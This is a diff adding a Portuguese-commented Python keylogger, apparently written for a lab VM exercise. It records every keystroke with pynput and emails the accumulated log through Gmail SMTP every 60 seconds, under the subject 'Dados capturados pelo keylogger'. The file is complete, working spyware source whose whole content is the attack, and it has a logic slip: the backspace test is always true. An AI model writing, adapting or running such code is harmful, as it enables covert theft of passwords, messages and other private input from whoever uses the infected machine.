@@ -1,0 +1,58 @@
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer 
+
+log = ""
+#configurações de email
+INTERVALO_ENVIO = 60
+EMAIL_ORIGEM = "key.logger.env@gmail.com"
+EMAIL_DESTINO = "key.logger.env@gmail.com"
+SENHA_EMAIL = "xxxx xxxx xxxx xxxx"
+
+def enviar_email():
+    global log
+    if log:
+        msg = MIMEText(log)
+        msg['SUBJECT'] = "Dados capturados pelo keylogger"
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+            server.send_message(msg)
+            server.quit()
+            print(f"Email enviado com sucesso. Tam. log: {len(log)} caracteres.")
+        except Exception as e:
+            print("Erro ao enviar", e)    
+        log = ""
+    else:
+        print("Nenhum dado novo para enviar.")
+    # Agendar o envio a cada 60 segundos
+    Timer(INTERVALO_ENVIO, enviar_email).start()
+
+def on_press(key):
+    global log
+    try:
+        if key.char is not None:
+            log += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n[ENTER]\n"
+        elif keyboard.Key.backspace:
+            log +="[<BACKSPACE>]"
+        else:
+            log += f"[{str(key).split('.')[-1].upper()}]"
+print(f"Iniciando keylogger (LAB - VM) e agendamento de envio a cada {INTERVALO_ENVIO} segundos...")
+enviar_email()
+listener = keyboard.Listener(on_press=on_press)
+listener.start()
+try:
+    listener.join()
+except KeyboardInterrupt:
+    # Permite que o usuário encerre o script com Ctrl+C
+    print("\nPrograma encerrado pelo usuário.")
+    listener.stop() # Garante que o listener pare
